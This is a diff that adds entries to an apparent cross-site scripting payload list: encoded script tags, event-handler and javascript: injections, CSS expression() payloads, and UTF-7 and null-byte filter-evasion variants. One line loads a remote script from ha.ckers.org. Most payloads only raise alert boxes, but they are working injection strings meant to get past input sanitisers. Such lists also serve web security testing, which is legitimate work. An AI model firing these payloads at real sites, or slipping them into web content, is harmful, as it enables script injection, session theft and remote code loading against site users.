@@ -1,3 +1,32 @@
+%3C = <
+%3Cimg/src=%3Dx+onload=alert(2)%3D
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(0x0000EB)%3C/script%3E 
+48e71%3balert(1)//503466e3
+';confirm('XSS')//1491b2as
+a29b1%3balert(888)//a62b7156d82
+<scr&#x9ipt>alert('XSS')</scr&#x9ipt>
+
+No Tags < >
+	"onmouseover%3dprompt(941634) 
+	%f6%22%20onmouseover%3dprompt(941634)%20
+	" onerror=alert()1 a="
+	style=xss:expression(alert(1))
+	<input type=text value=“XSS”>
+		A” autofocus onfocus=alert(“XSS”)//
+	<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>	
+	<a href="javascript:alert(1)">ssss</a>
+
+UTF-7:
++ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
++ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-
++ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-
+<%00script>alert(‘XSS’)<%00/script>
+
+<%script>alert(‘XSS’)<%/script>
+<%tag style=”xss:expression(alert(‘XSS’))”>
+<%tag    onmouseover="(alert('XSS'))"> is invalid. <%br />
+</b style="expr/**/ession(alert('vulnerable'))">
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&{()}
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
